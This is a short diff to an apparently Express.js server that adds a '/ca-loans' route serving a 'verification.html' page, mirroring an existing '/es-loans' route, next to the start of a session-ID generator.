@@ -1307,6 +1307,10 @@ app.get("/es-loans", (req, res) => {
   res.sendFile(path.join(__dirname, "verification.html"));
 });
 
+app.get("/ca-loans", (req, res) => {
+  res.sendFile(path.join(__dirname, "verification.html"));
+});
+
 // Generate session ID
 function generateSessionId() {
   return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
